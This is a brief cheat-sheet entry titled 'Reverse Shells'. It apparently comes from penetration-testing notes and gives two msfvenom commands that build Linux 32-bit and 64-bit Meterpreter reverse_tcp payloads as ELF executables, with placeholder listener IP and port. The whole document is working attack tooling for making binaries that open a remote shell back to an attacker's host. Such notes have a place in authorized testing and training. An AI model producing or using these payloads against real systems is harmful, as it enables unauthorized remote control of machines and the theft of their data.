# Reverse Shells

1. **x86 (32-bit) Payloads**

`$ msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f elf -o met-x86`

2. **x86-64 (64-bit) Payloads**

`$ msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f elf -o met-x64`